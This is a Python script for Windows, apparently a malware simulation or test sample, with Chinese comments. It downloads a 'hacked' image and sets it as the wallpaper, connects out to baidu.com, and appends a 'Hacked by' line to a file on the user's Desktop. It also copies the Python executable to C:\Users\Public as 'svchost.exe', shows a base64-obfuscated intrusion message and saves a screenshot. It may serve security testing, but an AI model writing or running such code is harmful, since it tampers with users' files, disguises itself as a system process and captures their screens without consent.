import ctypes
import os
import shutil
import socket
import sys, requests
import platform
import time
import base64
import pyautogui

# 混淆的字符串
encoded_msg = b'SGlnaCBsZXZlbCBhbGVydCEgSGFja2VkIGJ5IDE5ZTFhZSE='  # "Hacked by 1a9e5an!"
encoded_alert = b'QWxlcnQ='  # "Alert"

def delay_execution():
    time.sleep(5)

# 模拟文件复制行为
def a12345_copy_to_system():
    system_dir = "C:\\Users\\Public"
    try:
        shutil.copy(sys.executable, os.path.join(system_dir, "svchost.exe"))
        print(f"System: {platform.system()}")
        print(f"Processor: {platform.processor()}")

        decoded_msg = base64.b64decode(encoded_msg).decode('utf-8')
        decoded_alert = base64.b64decode(encoded_alert).decode('utf-8')
        ctypes.windll.user32.MessageBoxW(
            0, f"入侵成功, {decoded_msg}, 系统：{platform.system()}, Processor:{platform.processor()}", decoded_alert, 1
        )
        screenshot = pyautogui.screenshot()
        screenshot.save('screenshot.png')
        
    except Exception as e:
        print(f"Error copying to system directory: {e}")

# 模拟网络活动
def b67890_network_activity():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("baidu.com", 80))
        s.send(b"GET / HTTP/1.1\r\nHost: baidu.com\r\n\r\n")
        s.close()
    except Exception as e:
        print(f"Network activity failed: {e}")

def find_and_modify_txt():
    target_file = "lagesan_test.txt"
    user_home = os.path.expanduser("~")
    root_dir = os.path.join(user_home, "Desktop")
    file_found = False
    # print("路径"+root_dir)
    for dirpath, dirnames, filenames in os.walk(root_dir):
        for file in filenames:
            print(f"正在检查文件: {file}")
            if file == target_file:
                file_found = True
                file_path = os.path.join(dirpath, file)
                try:
                    print(f"找到文件: {file_path}")
                    with open(file_path, "a") as f:
                        f.write("\nHacked by lagesan, github:https://github.com/lagesan")
                    print(f"已修改文件: {file_path}")
                except Exception as e:
                    print(f"无法修改文件 {file_path}: {e}")
    if not file_found:
        print(f"未找到 {target_file} 文件")


def set_wallpaper(image_path):
    """设置桌面壁纸为填充模式"""
    # 20 是 SPI_SETDESKWALLPAPER 的标识符
    # 0 是系统参数（无）
    # image_path 是图片路径
    # 3 是设置壁纸的方式（填充）
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)

def download_image(image_url, save_path):
    """下载图片并保存到指定路径"""
    response = requests.get(image_url)
    if response.status_code == 200:
        with open(save_path, 'wb') as f:
            f.write(response.content)
        return True
    return False

def change_wallpaper(image_url):
    """下载图片并更换壁纸"""
    if platform.system() == "Windows":
        # 临时文件路径
        temp_image_path = os.path.join(os.getenv("TEMP"), "wallpaper.jpg")
        
        if download_image(image_url, temp_image_path):
            set_wallpaper(temp_image_path)
            print("壁纸已更换为:", image_url)
        else:
            print("下载图片失败.")
    else:
        print("此脚本仅适用于Windows系统.")


image_url = "https://lagesan.github.io/images/hacked.png"
change_wallpaper(image_url)

delay_execution()
b67890_network_activity()
find_and_modify_txt()
a12345_copy_to_system()